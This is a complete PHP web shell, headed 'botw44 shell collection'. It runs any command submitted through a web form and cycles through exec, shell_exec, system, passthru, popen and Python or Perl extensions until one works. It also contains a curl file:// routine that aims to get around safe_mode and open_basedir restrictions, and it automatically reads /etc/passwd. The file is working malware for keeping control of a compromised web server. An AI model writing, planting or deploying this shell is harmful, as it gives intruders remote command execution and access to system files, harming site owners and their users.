<?php
/*
botw44 shell
collection
*/

//simple
define("br","<br />\n");
define("ln","\n");
global $formcmd;
if(!empty($_POST["cmd"])) {
	$formcmd = $_POST["cmd"];
}
function wr($txt){echo $txt;}
function com($txt){wr("xplo@sexec~$ ".$txt);}
function root($txt){wr("xplo@sexec~# ".$txt);}
function funcex($func,$txt="Using: "){com($txt.$func.ln);return $var = function_exists($func);}
//styling
echo '<style>*{margin:0;padding:0;border:1;}input{float:left;}</style>'.ln;
echo '<form action="stest-minimized.php" method="post">'.ln;
echo '<textarea style="width: 100%; height: 10%;">'.ln;
//easy echo's
com("PHP Version: ".phpversion().ln);
com("Safe mode: ");
if(ini_get("safe_mode") || ini_get("safe_mode_gid")){
	wr("SafeMode <b>On</b>".ln);
	define("SAFEMODE",true);
}
else {
	wr("SafeMode Off".ln);
	define("SAFEMODE",false);
}
//command functions
function ex($cmd){
	global $result;
	if(!empty($cmd)) {
		if(SAFEMODE) {
			if(extension_loaded("python")){
				$result = python_eval("import os\nos.system('$cmd')");
				if(empty($result)) {
					$result = python_eval('import os\npwd = os.getcwd()\nprint pwd\nos.system("$cmd")');
				}
				return $result;
			}
			elseif(extension_loaded("perl")){
				$perl = new perl();
				$perl->eval("system('$cmd')");
				$result = $perl;
				return $result;
			}
		}
		else {
			if(funcex("exec")) {
				@exec($cmd,$result);
				$result = join("\n",$result);
			}
			elseif(funcex("shell_exec")) {
				$result = @shell_exec($cmd);
			}
			elseif(funcex("system")) {
				@ob_start();
				@system($cmd);
				$result = @ob_get_contents();
				@ob_end_clean();
			}
			elseif(funcex("passthru")) { 
				@ob_start();
				@passthru($cmd);
				$result = @ob_get_contents();
				@ob_end_clean();
			}
			elseif(@is_resource($f = @popen($cmd,"r"))) {
				while(!@feof($f)) {
					$result .= @fread($f,8192);
				}
				@pclose($f);
			}
		}
	}
	return $result; 
}
//bypass with curl for safe_mode & open_basedir
if(SAFEMODE) {
	global $strtotalfile;
	global $addallslashes;
	function curllf($strfile) {
		$strtotalfile = "file:file:";
		if(!file_exists("file:")) {
			mkdir("file:");
			chdir("file:");
		}
		else {
			chdir("file:");
		}
		$p = explode("/", $strfile);
		foreach($p as $key => $value) {
			if(!empty($value)) {
				if(!file_exists($value)) {
					mkdir($value);
					chdir($value);
				}
				else {
					chdir($value);
				}
			}
		}
		for($i=0;$i<count($p);$i++) {
			$addallslashes .= "/";
			chdir("..");
		}
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $strtotalfile.$addallslashes.$strfile);
		$result = curl_exec($ch);
		curl_close($ch);
		return $result;
	}
	//execute function
	if(funcex("curllf",'Bypass: safe_mode & open_basedir with function ')) {
		com('Using: curllf("/etc/passwd");'.br);
		curllf("/etc/passwd");
	}
}
echo '</textarea>'.ln;
echo '<textarea style="width: 100%; height: 70%;">'.ln;
wr(ex($formcmd));
echo '</textarea>'.ln;
echo '<input type="text" name="cmd" value="'.$formcmd.'" style="width: 100%; height: 10%;" />'.br;
echo '<input type="submit" name="exec" value="exec" style="width: 50%; height: 10%;" /><input type="reset" name="remove" value="remove" style="width: 50%; height: 10%;" />'.ln;
?>
